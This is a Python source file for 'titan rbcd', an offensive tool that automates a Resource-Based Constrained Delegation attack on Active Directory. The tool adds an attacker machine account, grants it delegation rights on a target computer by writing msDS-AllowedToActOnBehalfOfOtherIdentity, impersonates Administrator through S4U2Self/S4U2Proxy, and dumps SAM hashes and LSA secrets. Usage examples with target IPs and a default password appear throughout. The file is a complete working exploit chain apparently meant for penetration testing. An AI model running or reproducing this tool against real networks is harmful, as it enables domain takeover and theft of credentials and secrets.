#!/usr/bin/env python3
"""
titan rbcd — Resource-Based Constrained Delegation attack via Titanis

RBCD attack chain:
  1. Add a new machine account (attacker-controlled) with a known password
  2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the TARGET computer
     to grant the new machine account delegation rights
  3. (full) S4U2Self+S4U2Proxy to impersonate a privileged user to the target
  4. (full) Use the resulting service ticket to dump SAM + LSA secrets

Usage:
    # Full auto: setup + S4U + secretsdump in one shot
    titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40

    # Setup only — write RBCD attribute, print follow-up commands
    titan rbcd setup --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40

    # S4U + dump assuming rights are already in place
    titan rbcd dump -d ECORP -dc-ip 192.168.15.40 \\
        --delegate-to ECORP-DC$ --delegate-from mybox$ --machine-pass 'Titanis1!'

    # Cleanup — remove RBCD attribute
    titan rbcd cleanup --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
"""

import argparse
import csv
import hashlib
import io
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import uuid

from titanlib.common import (find_binary, run, add_auth_args, auth_args,
                              apply_target_string, validate_auth)

LDAP = KERB = REG = None
ADDCOMPUTER_PY = None
GETST_PY       = None

GREEN  = '\033[1;32m'
YELLOW = '\033[1;33m'
RED    = '\033[1;31m'
CYAN   = '\033[1;36m'
RESET  = '\033[0m'

BANNER = f"""{GREEN}
  titan rbcd — Resource-Based Constrained Delegation
  Titanis-native RBCD attack chain
{RESET}"""


# ── Security descriptor helpers ───────────────────────────────────────────────

def _sid_bytes(sid_str):
    """Parse 'S-1-5-...' → packed binary SID."""
    parts           = sid_str.split('-')
    revision        = 1
    authority       = int(parts[2])
    sub_authorities = [int(x) for x in parts[3:]]
    count           = len(sub_authorities)
    buf  = struct.pack('BB', revision, count)
    buf += struct.pack('>IH', 0, authority)
    for sa in sub_authorities:
        buf += struct.pack('<I', sa)
    return buf


def _build_security_descriptor(attacker_sid_str):
    """Self-relative SD matching impacket format — DACL with one allow-all ACE."""
    owner_sid = _sid_bytes('S-1-5-32-544')
    attacker  = _sid_bytes(attacker_sid_str)

    ace_size = 8 + len(attacker)
    ace  = struct.pack('<BBH', 0, 0, ace_size)
    ace += struct.pack('<I', 0xf01ff)
    ace += attacker

    dacl_size = 8 + ace_size
    dacl  = struct.pack('<BB', 4, 0)
    dacl += struct.pack('<HH', dacl_size, 1)
    dacl += struct.pack('<H', 0)
    dacl += ace

    dacl_offset  = 20
    owner_offset = 20 + len(dacl)
    sd_header    = struct.pack('<BBH', 1, 0, 0x8004)
    sd_header   += struct.pack('<IIII', owner_offset, 0, 0, dacl_offset)
    return sd_header + dacl + owner_sid


# ── LDAP helpers ──────────────────────────────────────────────────────────────

def get_computer_sid(dc, auth, computer_name, domain, verbose=False):
    sam = computer_name.rstrip('$') + '$'
    out, rc = run(LDAP, 'query', auth,
                  [dc, f'(sAMAccountName={sam})',
                   '-OutputFields', 'objectSid', '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=20)
    if rc != 0 or not out.strip():
        return None
    for line in out.splitlines():
        line = line.strip()
        if line and not line.startswith('objectSid'):
            return line.strip().strip('"')
    return None


def get_computer_dn(dc, auth, computer_name, verbose=False):
    sam = computer_name.rstrip('$') + '$'
    out, rc = run(LDAP, 'query', auth,
                  [dc, f'(sAMAccountName={sam})',
                   '-OutputFields', 'distinguishedName', '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=20)
    if rc != 0 or not out.strip():
        return None
    for line in out.splitlines():
        line = line.strip()
        if line and not line.startswith('distinguishedName'):
            return line.strip().strip('"')
    return None


def _parse_sddl_sids(sddl):
    if not sddl:
        return []
    return re.findall(r'\(A;[^;]*;[^;]*;[^;]*;[^;]*;(S-\d+-[\d-]+)\)', sddl)


def get_rbcd_attr(dc, auth, target_dn, verbose=False):
    out, rc = run(LDAP, 'query', auth,
                  [dc, f'(distinguishedName={target_dn})',
                   '-OutputFields', 'msDS-AllowedToActOnBehalfOfOtherIdentity',
                   '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=20)
    if rc != 0:
        return None
    for line in out.splitlines():
        line = line.strip().strip('"')
        if line and 'msDS-Allowed' not in line:
            return line
    return ''


def _lookup_sid(dc, auth, sid, verbose=False):
    out, rc = run(LDAP, 'query', auth,
                  [dc, f'(objectSid={sid})',
                   '-OutputFields', 'sAMAccountName', '-ConsoleOutputStyle', 'Csv'],
                  verbose=verbose, timeout=10)
    if rc != 0 or not out.strip():
        return None
    for line in out.splitlines():
        line = line.strip().strip('"')
        if line and 'sAMAccountName' not in line:
            return line
    return None


def print_rbcd_state(dc, auth, target_name, target_dn, sddl, verbose=False):
    sids = _parse_sddl_sids(sddl)
    if not sids:
        print(f'{CYAN}[*]{RESET} Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
        return
    print(f'{CYAN}[*]{RESET} Accounts allowed to act on behalf of other identity:')
    for sid in sids:
        name = _lookup_sid(dc, auth, sid, verbose=verbose) or sid
        print(f'{CYAN}[*]{RESET}     {name:<20} ({sid})')


def add_machine_account(dc, auth, machine_name, machine_pass, domain, args=None, verbose=False):
    if not ADDCOMPUTER_PY:
        return '[!] addcomputer.py not found on PATH', 1

    name = machine_name.rstrip('$')
    cred = args.username
    if getattr(args, 'domain', None):
        cred = f'{args.domain}/{cred}'
    if getattr(args, 'ntlm_hash', None):
        cred_str = f'{cred}:'
        extra = ['-hashes', f':{args.ntlm_hash}']
    elif getattr(args, 'password', None):
        cred_str = f'{cred}:{args.password}'
        extra = []
    else:
        cred_str = cred
        extra = []

    cmd = [ADDCOMPUTER_PY,
           '-dc-ip', dc,
           '-computer-name', name,
           '-computer-pass', machine_pass,
           ] + extra + [cred_str]

    if verbose:
        print(f'  >> {" ".join(cmd)}', file=sys.stderr)

    try:
        r = subprocess.run(cmd, capture_output=True, timeout=30)
        out = r.stdout.decode('utf-8', errors='replace') + r.stderr.decode('utf-8', errors='replace')
        rc  = r.returncode
        if rc == 0 and 'Successfully added machine account' not in out:
            rc = 1
        return out, rc
    except Exception as e:
        return str(e), 1


def write_rbcd(dc, auth, target_dn, attacker_sid, verbose=False):
    sd      = _build_security_descriptor(attacker_sid)
    sd_file = f'/tmp/rbcd_{uuid.uuid4().hex}.bin'
    try:
        with open(sd_file, 'wb') as fh:
            fh.write(sd)
        attr_val = f'msDS-AllowedToActOnBehalfOfOtherIdentity:file={sd_file}'
        out, rc = run(LDAP, 'mod', auth,
                      [dc, '-ObjectName', target_dn, attr_val],
                      verbose=verbose, timeout=30)
    finally:
        if os.path.exists(sd_file):
            os.unlink(sd_file)
    return out, rc


def clear_rbcd(dc, auth, target_dn, verbose=False):
    """Overwrite RBCD attribute with an empty DACL (effectively removes delegation)."""
    owner_sid    = _sid_bytes('S-1-5-32-544')
    dacl_size    = 8
    dacl         = struct.pack('<BB', 4, 0)
    dacl        += struct.pack('<HH', dacl_size, 0)
    dacl        += struct.pack('<H', 0)
    dacl_offset  = 20
    owner_offset = 20 + len(dacl)
    sd_header    = struct.pack('<BBH', 1, 0, 0x8004)
    sd_header   += struct.pack('<IIII', owner_offset, 0, 0, dacl_offset)
    sd           = sd_header + dacl + owner_sid

    sd_file = f'/tmp/rbcd_{uuid.uuid4().hex}.bin'
    try:
        with open(sd_file, 'wb') as fh:
            fh.write(sd)
        attr_val = f'msDS-AllowedToActOnBehalfOfOtherIdentity:file={sd_file}'
        out, rc = run(LDAP, 'mod', auth,
                      [dc, '-ObjectName', target_dn, attr_val],
                      verbose=verbose, timeout=30)
    finally:
        if os.path.exists(sd_file):
            os.unlink(sd_file)
    return out, rc


# ── Kerberos helpers ──────────────────────────────────────────────────────────

def s4u_impersonate(kdc, machine_name, machine_pass, domain, target_spn,
                    impersonate_user, out_ccache, args, verbose=False):
    """S4U2Self + S4U2Proxy via impacket getST.py (NT-ENTERPRISE principal type)."""
    if not GETST_PY:
        return '[!] getST.py not found on PATH', 1

    sam = machine_name.rstrip('$') + '$'

    if getattr(args, 'ntlm_hash', None):
        cred_str = f'{domain}/{sam}:'
        extra    = ['-hashes', f':{args.ntlm_hash}']
    else:
        cred_str = f'{domain}/{sam}:{machine_pass}'
        extra    = []

    cmd = [GETST_PY,
           '-spn', target_spn,
           '-impersonate', impersonate_user,
           '-dc-ip', kdc,
           ] + extra + [cred_str]

    spn_safe   = target_spn.replace('/', '_')
    realm      = domain.upper()
    saved_name = f'{impersonate_user}@{spn_safe}@{realm}.ccache'
    tmpdir     = os.path.dirname(out_ccache)
    saved_path = os.path.join(tmpdir, saved_name)

    if os.path.exists(saved_path):
        os.unlink(saved_path)

    if verbose:
        print(f'  >> (cwd={tmpdir}) {" ".join(cmd)}', file=sys.stderr)

    try:
        r = subprocess.run(cmd, capture_output=True, timeout=60, cwd=tmpdir)
        out = r.stdout.decode('utf-8', errors='replace') + r.stderr.decode('utf-8', errors='replace')
        rc  = r.returncode

        if rc == 0:
            if os.path.exists(saved_path) and saved_path != out_ccache:
                os.rename(saved_path, out_ccache)
            if not os.path.exists(out_ccache):
                rc = 1

        return out, rc
    except Exception as e:
        return str(e), 1


# ── Secretsdump via Reg ───────────────────────────────────────────────────────

EMPTY_LM = 'aad3b435b51404eeaad3b435b51404ee'
EMPTY_NT = '31d6cfe0d16ae931b73c59d7e0c089c0'


def _utf16le(hex_str):
    try:
        return bytes.fromhex(hex_str).decode('utf-16-le').rstrip('\x00')
    except Exception:
        return None


def _format_sam(raw_csv):
    lines = ['\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)', '-' * 60]
    count = 0
    for row in csv.DictReader(io.StringIO(raw_csv)):
        user = row.get('AccountName', '').strip()
        rid  = row.get('Rid', '').strip().replace(',', '')
        nt   = (row.get('NtlmHashText', '') or EMPTY_NT).strip()
        if user:
            lines.append(f'{user}:{rid}:{EMPTY_LM}:{nt}:::')
            count += 1
    if count == 0:
        lines.append('  (no accounts found or access denied)')
    return lines


def _format_lsa(raw_csv):
    lines    = []
    nlkm_hex = None

    for row in csv.DictReader(io.StringIO(raw_csv)):
        name = row.get('Name', '').strip()
        cur  = (row.get('CurrentValueHex', '') or '').strip()
        old  = (row.get('OldValueHex',     '') or '').strip()
        if not name:
            continue

        if name == 'NL$KM':
            nlkm_hex = cur
        elif name == '$MACHINE.ACC':
            if cur:
                nt = hashlib.new('md4', bytes.fromhex(cur)).hexdigest()
                lines.append(f'$MACHINE.ACC: {nt}')
            if old and old != cur:
                nt_old = hashlib.new('md4', bytes.fromhex(old)).hexdigest()
                lines.append(f'$MACHINE.ACC (old): {nt_old}')
        elif name == 'DPAPI_SYSTEM':
            if cur and len(cur) >= 88:
                blob = bytes.fromhex(cur)
                lines.append('DPAPI_SYSTEM')
                lines.append(f'  dpapi_machinekey: 0x{blob[4:24].hex()}')
                lines.append(f'  dpapi_userkey:    0x{blob[24:44].hex()}')
        elif name == 'DefaultPassword':
            if cur:
                pw = _utf16le(cur)
                lines.append(f'DefaultPassword: {pw or cur}')
        elif name.startswith('L$') or name.startswith('NL$'):
            pass
        else:
            if cur:
                lines.append(f'{name}: {cur}')

    out = []
    if lines:
        out.append('\n[*] Dumping LSA Secrets')
        out.append('-' * 60)
        out.extend(lines)
    return out, nlkm_hex


def dump_secrets(target_host, ccache_file, kdc, impersonate_user, domain,
                 output_file=None, verbose=False):
    """Dump SAM + LSA secrets using Reg with a Kerberos service ticket (ccache)."""
    ticket_auth = ['-UserName', impersonate_user,
                   '-UserDomain', domain,
                   '-Kdc', kdc,
                   '-TicketCache', ccache_file]

    all_lines = [f'[*] Target: {target_host}', '=' * 70]

    print(f'\n{CYAN}[*] Dumping SAM...{RESET}')
    sam_csv, rc = run(REG, 'dumpsam', ticket_auth,
                      [target_host, '-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
                      verbose=verbose, timeout=60)
    if rc == 0 and sam_csv.strip():
        sam_lines = _format_sam(sam_csv)
        all_lines.extend(sam_lines)
        for l in sam_lines:
            print(l)
    else:
        msg = f'{RED}[!] SAM dump failed (rc={rc}){RESET}'
        print(msg)
        if sam_csv.strip() and verbose:
            print(sam_csv.rstrip())

    print(f'\n{CYAN}[*] Dumping LSA secrets...{RESET}')
    lsa_csv, rc = run(REG, 'dumplsasecrets', ticket_auth,
                      [target_host, '-BackupSemantics', '-ConsoleOutputStyle', 'Csv'],
                      verbose=verbose, timeout=60)
    if rc == 0 and lsa_csv.strip():
        lsa_lines, _ = _format_lsa(lsa_csv)
        all_lines.extend(lsa_lines)
        for l in lsa_lines:
            print(l)
    else:
        msg = f'{RED}[!] LSA dump failed (rc={rc}){RESET}'
        print(msg)
        if lsa_csv.strip() and verbose:
            print(lsa_csv.rstrip())

    if output_file:
        try:
            with open(output_file, 'w') as fh:
                fh.write('\n'.join(all_lines) + '\n')
            print(f'\n{GREEN}[+]{RESET} Output written to {output_file}')
        except Exception as e:
            print(f'{RED}[!] Could not write output file: {e}{RESET}')


# ── Main attack chain ─────────────────────────────────────────────────────────

def attack(args):
    dc      = args.target
    domain  = (args.domain or '').upper()
    realm   = domain

    machine_name = args.delegate_from.rstrip('$')
    machine_pass = args.machine_pass
    target_name  = args.delegate_to.rstrip('$')
    impersonate  = args.impersonate
    full         = args.full
    verbose      = args.verbose
    kdc          = args.kdc or dc
    dc_host      = args.dc or f'{target_name}.{domain.lower()}'

    auth = auth_args(args)

    print(BANNER)
    print(f'{GREEN}[*]{RESET} Target DC   : {dc}')
    print(f'{GREEN}[*]{RESET} Domain      : {domain}')
    print(f'{GREEN}[*]{RESET} Attacker    : {args.username}')
    print(f'{GREEN}[*]{RESET} Delegate-to : {target_name}$')
    print(f'{GREEN}[*]{RESET} Machine acct: {machine_name}$')
    if full:
        print(f'{GREEN}[*]{RESET} Impersonate : {impersonate}')
        print(f'{GREEN}[*]{RESET} Mode        : full auto (S4U + dump)')
    print()

    print(f'\n{CYAN}[*] STEP 1 — Create attacker machine account{RESET}')
    print(f'{GREEN}[+]{RESET} Creating machine account {machine_name}$ on {dc_host} ...')
    out, rc = add_machine_account(dc_host, auth, machine_name, machine_pass, domain,
                                  args=args, verbose=verbose)
    if rc == 0:
        print(f'{GREEN}[+]{RESET} Machine account {machine_name}$ created (password: {machine_pass})')
    else:
        existing_dn = get_computer_dn(dc, auth, machine_name, verbose=verbose)
        if existing_dn:
            print(f'{YELLOW}[~]{RESET} Machine account {machine_name}$ already exists — using it')
            print(f'{YELLOW}[~]{RESET} Ensure --machine-pass matches its actual password')
        else:
            print(f'{RED}[!]{RESET} Failed to create machine account.')
            print(f'{RED}[!]{RESET} Try a different --delegate-from name or check MachineAccountQuota.')
            sys.exit(1)

    print(f'\n{CYAN}[*] STEP 2 — Resolve attacker machine account SID{RESET}')
    machine_sid = get_computer_sid(dc, auth, machine_name, domain, verbose=verbose)
    if not machine_sid:
        print(f'{RED}[!]{RESET} Could not retrieve SID for {machine_name}$ — check account exists')
        sys.exit(1)
    print(f'{GREEN}[+]{RESET} {machine_name}$ SID: {machine_sid}')

    print(f'\n{CYAN}[*] STEP 3 — Resolve target computer distinguished name{RESET}')
    target_dn = get_computer_dn(dc, auth, target_name, verbose=verbose)
    if not target_dn:
        print(f'{RED}[!]{RESET} Could not retrieve DN for {target_name}$ — check target name')
        sys.exit(1)
    print(f'{GREEN}[+]{RESET} {target_name}$ DN: {target_dn}')

    print(f'\n{CYAN}[*] STEP 4 — Write RBCD attribute on target{RESET}')
    before = get_rbcd_attr(dc, auth, target_dn, verbose=verbose)
    print_rbcd_state(dc, auth, target_name, target_dn, before, verbose=verbose)

    out, rc = write_rbcd(dc, auth, target_dn, machine_sid, verbose=verbose)
    if rc != 0:
        print(f'{RED}[!]{RESET} Failed to write RBCD attribute:\n{out}')
        sys.exit(1)

    after = get_rbcd_attr(dc, auth, target_dn, verbose=verbose)
    if not after:
        print(f'{RED}[!]{RESET} Attribute write appeared to succeed but value is not present')
        sys.exit(1)
    print(f'{CYAN}[*]{RESET} {machine_name}$ can now impersonate users on {target_name}$ via S4U2Proxy')
    print_rbcd_state(dc, auth, target_name, target_dn, after, verbose=verbose)

    if not full:
        target_spn = f'cifs/{target_name}'
        print(f"""
{GREEN}[+] RBCD configured. Next steps:{RESET}

  # 1. Get service ticket (S4U2Self + S4U2Proxy)
  getST.py -spn '{target_spn}' -impersonate {impersonate} \\
      -dc-ip {dc} '{domain}/{machine_name}$:{machine_pass}'

  # 2. Dump secrets with the ticket
  KRB5CCNAME={impersonate}@cifs_{target_name}@{domain}.ccache \\
      titan dump -k -no-pass -t {target_name}.{domain.lower()}
    -- or with impacket --
  KRB5CCNAME={impersonate}@cifs_{target_name}@{domain}.ccache \\
      secretsdump.py -k -no-pass {domain}/{impersonate}@{target_name}.{domain.lower()}

  # Cleanup
  titan rbcd cleanup --delegate-to {target_name}$ <same auth args>
""")
        return

    tmpdir      = tempfile.mkdtemp(prefix='titan_rbcd_')
    st_ccache   = os.path.join(tmpdir, f'{impersonate}.ccache')
    target_fqdn = f'{target_name}.{domain.lower()}'
    target_spn  = f'cifs/{target_fqdn}'

    try:
        print(f'\n{CYAN}[*] STEP 5 — S4U2Self + S4U2Proxy (obtain impersonation ticket){RESET}')
        print(f'{GREEN}[+]{RESET} Requesting service ticket: {impersonate} → {target_spn} ...')
        out, rc = s4u_impersonate(dc_host, machine_name, machine_pass, domain,
                                  target_spn, impersonate, st_ccache, args, verbose=verbose)
        if rc != 0 or not os.path.exists(st_ccache):
            print(f'{RED}[!]{RESET} S4U failed:\n{out}')
            sys.exit(1)
        print(f'{GREEN}[+]{RESET} Service ticket saved: {st_ccache}')
        if verbose and out.strip():
            print(out.rstrip())

        print(f'\n{CYAN}[*] STEP 6 — Dump SAM and LSA secrets{RESET}')
        print(f'{GREEN}[+]{RESET} Connecting to {dc_host} as {impersonate} ...')
        dump_secrets(dc_host, st_ccache, dc_host, impersonate, domain,
                     output_file=args.output_file, verbose=verbose)

    finally:
        if args.no_cleanup:
            print(f'\n{YELLOW}[~]{RESET} Skipping cleanup (--no-cleanup). To remove manually:')
            print(f'    titan rbcd cleanup --delegate-to {target_name}$ <same auth args>')
        else:
            print(f'\n{CYAN}[*] STEP 7 — Remove RBCD attribute (cleanup){RESET}')
            out, rc = clear_rbcd(dc, auth, target_dn, verbose=verbose)
            if rc != 0:
                print(f'{RED}[!]{RESET} Cleanup failed — remove manually:')
                print(f'    titan rbcd cleanup --delegate-to {target_name}$ <same auth args>')
                return

            after_clean = get_rbcd_attr(dc, auth, target_dn, verbose=verbose)
            if after_clean and after_clean == after:
                print(f'{YELLOW}[~]{RESET} Attribute unchanged after cleanup — verify manually')
            else:
                print_rbcd_state(dc, auth, target_name, target_dn, after_clean, verbose=verbose)


# ── Shared arg helpers ────────────────────────────────────────────────────────

def _add_common_args(p):
    p.add_argument('target_string', nargs='?',
                   metavar='[[domain/]user[:pass]@]host')
    add_auth_args(p)
    p.add_argument('-t', '--target', metavar='HOST', help='Target DC IP or hostname')
    p.add_argument('--dc', metavar='FQDN',
                   help='DC hostname (e.g. dc01.corp.local) when --target is an IP')
    p.add_argument('-v', '--verbose', action='store_true')


def _add_rbcd_args(p):
    rbcd = p.add_argument_group('RBCD')
    rbcd.add_argument('--delegate-to', metavar='COMPUTER', required=True,
                      help='Target computer to configure RBCD on (e.g. ECORP-DC$)')
    rbcd.add_argument('--delegate-from', metavar='NAME', default=None,
                      help='Machine account name to create/use (default: auto-generated)')
    rbcd.add_argument('--machine-pass', metavar='PASS', default='Titanis1!',
                      help='Password for the machine account (default: Titanis1!)')


def _finalise(args, p):
    apply_target_string(args, host_attr='target')
    validate_auth(args, p, require_cred=True)
    if not args.target:
        p.error('target DC is required (-t or target_string)')
    if not args.domain:
        p.error('domain is required (-d)')
    if hasattr(args, 'delegate_from'):
        if args.delegate_from is not None:
            args.delegate_from = args.delegate_from.rstrip('$')
        elif args.subcommand not in ('dump', 'cleanup'):
            args.delegate_from = 'titan' + uuid.uuid4().hex[:6]
            print(f'[*] Auto-generated machine account name: {args.delegate_from}$',
                  file=sys.stderr)
    if hasattr(args, 'delegate_to'):
        args.delegate_to = args.delegate_to.rstrip('$')


# ── Subcommand: full ──────────────────────────────────────────────────────────

def cmd_full(args):
    args.full = True
    attack(args)


def _parser_full(sub):
    p = sub.add_parser(
        'full',
        help='Full auto: setup RBCD + S4U2Proxy + dump in one shot',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
Examples:
  titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
  titan rbcd full --delegate-to ECORP-DC$ --impersonate Administrator \\
      --no-cleanup ECORP/user:'pass'@192.168.15.40
''')
    _add_common_args(p)
    _add_rbcd_args(p)
    p.add_argument('--impersonate', metavar='USER', default='Administrator',
                   help='User to impersonate via S4U (default: Administrator)')
    p.add_argument('--no-cleanup', action='store_true',
                   help='Skip auto-cleanup of the RBCD attribute after dumping')
    p.add_argument('-o', '--output-file', metavar='FILE',
                   help='Write dump output to FILE')
    p.set_defaults(func=cmd_full)
    return p


# ── Subcommand: setup ─────────────────────────────────────────────────────────

def cmd_setup(args):
    args.full        = False
    args.no_cleanup  = False
    args.impersonate = getattr(args, 'impersonate', 'Administrator')
    args.output_file = None
    attack(args)


def _parser_setup(sub):
    p = sub.add_parser(
        'setup',
        help='Write RBCD attribute only — print manual follow-up commands',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
Examples:
  titan rbcd setup --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
''')
    _add_common_args(p)
    _add_rbcd_args(p)
    p.add_argument('--impersonate', metavar='USER', default='Administrator',
                   help='User to impersonate (used in printed commands)')
    p.set_defaults(func=cmd_setup)
    return p


# ── Subcommand: dump ──────────────────────────────────────────────────────────

def cmd_dump(args):
    """S4U + secretsdump assuming RBCD rights are already configured."""
    domain      = (args.domain or '').upper()
    target_name = args.delegate_to
    dc_host     = args.dc_host
    impersonate = args.impersonate
    target_spn  = f'cifs/{target_name}.{domain.lower()}'

    args.ntlm_hash = args.machine_hash

    print(BANNER)
    print(f'{GREEN}[*]{RESET} Target      : {dc_host}')
    print(f'{GREEN}[*]{RESET} Domain      : {domain}')
    print(f'{GREEN}[*]{RESET} Machine acct: {args.delegate_from}$')
    print(f'{GREEN}[*]{RESET} Impersonate : {impersonate}')
    print()

    tmpdir    = tempfile.mkdtemp(prefix='titan_rbcd_')
    st_ccache = os.path.join(tmpdir, f'{impersonate}.ccache')

    try:
        print(f'\n{CYAN}[*] STEP 1 — S4U2Self + S4U2Proxy{RESET}')
        print(f'{GREEN}[+]{RESET} Requesting service ticket: {impersonate} → {target_spn} ...')
        out, rc = s4u_impersonate(dc_host, args.delegate_from, args.machine_pass, domain,
                                  target_spn, impersonate, st_ccache, args, verbose=args.verbose)
        if rc != 0 or not os.path.exists(st_ccache):
            print(f'{RED}[!]{RESET} S4U failed:\n{out}')
            sys.exit(1)
        print(f'{GREEN}[+]{RESET} Service ticket saved: {st_ccache}')
        if args.verbose and out.strip():
            print(out.rstrip())

        print(f'\n{CYAN}[*] STEP 2 — Dump SAM and LSA secrets{RESET}')
        print(f'{GREEN}[+]{RESET} Connecting to {dc_host} as {impersonate} ...')
        dump_secrets(dc_host, st_ccache, dc_host, impersonate, domain,
                     output_file=args.output_file, verbose=args.verbose)

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def _parser_dump(sub):
    p = sub.add_parser(
        'dump',
        help='S4U + secretsdump assuming RBCD rights are already in place',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
Examples:
  titan rbcd dump -d ECORP -dc-ip ecorp-dc.ecorp.local \\
      --delegate-to ECORP-DC$ --delegate-from mybox$ --machine-pass 'Titanis1!'
  titan rbcd dump -d ECORP -dc-ip ecorp-dc.ecorp.local \\
      --delegate-to ECORP-DC$ --delegate-from mybox$ --machine-hash <NT>
''')
    p.add_argument('-d', '--domain', metavar='DOMAIN', required=True)
    p.add_argument('-dc-ip', '--dc', dest='dc_host', metavar='FQDN', required=True,
                   help='DC hostname to connect to (e.g. dc01.corp.local)')
    p.add_argument('-v', '--verbose', action='store_true')

    rbcd = p.add_argument_group('Machine account')
    rbcd.add_argument('--delegate-to', metavar='COMPUTER', required=True,
                      help='Target computer to dump (e.g. ECORP-DC$)')
    rbcd.add_argument('--delegate-from', metavar='NAME', required=True,
                      help='Machine account already permitted to delegate on the target')

    cred = rbcd.add_mutually_exclusive_group(required=True)
    cred.add_argument('--machine-pass', metavar='PASS', default=None)
    cred.add_argument('--machine-hash', metavar='NT', default=None,
                      help='NT hash for the machine account (pass-the-hash)')

    p.add_argument('--impersonate', metavar='USER', default='Administrator')
    p.add_argument('-o', '--output-file', metavar='FILE')
    p.set_defaults(func=cmd_dump)
    return p


# ── Subcommand: cleanup ───────────────────────────────────────────────────────

def cmd_cleanup(args):
    auth      = auth_args(args)
    target_dn = get_computer_dn(args.target, auth, args.delegate_to, verbose=args.verbose)
    if not target_dn:
        print(f'[!] Could not find DN for {args.delegate_to}', file=sys.stderr)
        sys.exit(1)
    before = get_rbcd_attr(args.target, auth, target_dn, verbose=args.verbose)
    print_rbcd_state(args.target, auth, args.delegate_to, target_dn, before, verbose=args.verbose)
    if not before:
        print(f'{CYAN}[*]{RESET} Nothing to clean up.')
        return
    out, rc = clear_rbcd(args.target, auth, target_dn, verbose=args.verbose)
    if rc != 0:
        print(f'[!] Failed:\n{out}', file=sys.stderr)
        sys.exit(1)
    after = get_rbcd_attr(args.target, auth, target_dn, verbose=args.verbose)
    if after and after == before:
        print(f'[!] Attribute unchanged after cleanup — verify manually', file=sys.stderr)
        sys.exit(1)
    print_rbcd_state(args.target, auth, args.delegate_to, target_dn, after, verbose=args.verbose)


def _parser_cleanup(sub):
    p = sub.add_parser(
        'cleanup',
        help='Remove msDS-AllowedToActOnBehalfOfOtherIdentity from the target',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
Examples:
  titan rbcd cleanup --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
''')
    _add_common_args(p)
    rbcd = p.add_argument_group('RBCD')
    rbcd.add_argument('--delegate-to', metavar='COMPUTER', required=True)
    rbcd.add_argument('--delegate-from', metavar='NAME', default=None, help=argparse.SUPPRESS)
    rbcd.add_argument('--machine-pass', metavar='PASS', default=None, help=argparse.SUPPRESS)
    p.set_defaults(func=cmd_cleanup)
    return p


# ── Top-level parser + main ───────────────────────────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog='titan rbcd',
        description='titan rbcd — Resource-Based Constrained Delegation via Titanis',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
Subcommands:
  full      Full auto attack: machine account → RBCD attribute → S4U → dump → cleanup
  setup     Write RBCD attribute only, print manual follow-up commands
  dump      S4U + secretsdump assuming RBCD rights are already in place
  cleanup   Remove RBCD attribute from target

Run  titan rbcd <subcommand> -h  for per-subcommand help.
''')
    sub = p.add_subparsers(dest='subcommand', metavar='<subcommand>')
    sub.required = True
    _parser_full(sub)
    _parser_setup(sub)
    _parser_dump(sub)
    _parser_cleanup(sub)
    return p, sub


def main():
    global LDAP, KERB, REG, ADDCOMPUTER_PY, GETST_PY

    LDAP = find_binary('Ldap')
    KERB = find_binary('Kerb')
    REG  = find_binary('Reg')
    ADDCOMPUTER_PY = shutil.which('addcomputer.py')
    GETST_PY       = shutil.which('getST.py')

    missing = [n for n, b in [('Ldap', LDAP), ('Kerb', KERB), ('Reg', REG)] if not b]
    if missing:
        print(f'[!] required binaries not found: {", ".join(missing)}', file=sys.stderr)
        sys.exit(1)
    if not ADDCOMPUTER_PY:
        print('[!] addcomputer.py not found on PATH — machine account creation unavailable',
              file=sys.stderr)
    if not GETST_PY:
        print('[!] getST.py not found on PATH — full/dump subcommands require it for S4U',
              file=sys.stderr)

    p, _ = build_parser()
    args  = p.parse_args()
    if args.subcommand != 'dump':
        _finalise(args, p)
    else:
        args.delegate_to   = args.delegate_to.rstrip('$')
        args.delegate_from = args.delegate_from.rstrip('$')
    args.func(args)


if __name__ == '__main__':
    main()
